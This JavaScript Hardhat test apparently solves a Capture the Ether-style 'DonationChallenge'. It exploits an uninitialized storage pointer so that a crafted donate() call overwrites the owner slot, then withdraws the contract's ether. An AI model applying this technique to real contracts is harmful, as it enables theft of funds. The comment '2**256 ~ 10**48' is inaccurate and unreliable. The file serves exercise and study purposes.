const { loadFixture } = require("@nomicfoundation/hardhat-toolbox/network-helpers");
const { expect } = require("chai");
const { fixtureFactory } = require("../utils");
const assert = require('node:assert').strict;

it("Solves DonationChallenge", async function () {
  const [, attacker] = await ethers.getSigners();
  const fixture = () => fixtureFactory("DonationChallenge", ethers.parseEther("1.0"));
  const contract = await loadFixture(fixture);

  const attackerAddress = await attacker.getAddress();
  // 2**256 ~ 10**48, which means sentValueInWei ~10**-6.
  const sentValueInWei = BigInt(attackerAddress) / BigInt(10**36);

  // Since the storage location of `Donation` is on state instead of memory, we can override the `owner` slot by providing `etherAmount`.
  // Latest solc would give a warning for unintialized storage pointer.
  const contractConnectedToAttacker = contract.connect(attacker);
  await contractConnectedToAttacker.donate(BigInt(attackerAddress), {value: BigInt(attackerAddress) / BigInt(10**36)});
  await contractConnectedToAttacker.withdraw();

  expect(await contract.isComplete()).to.equal(true);
});
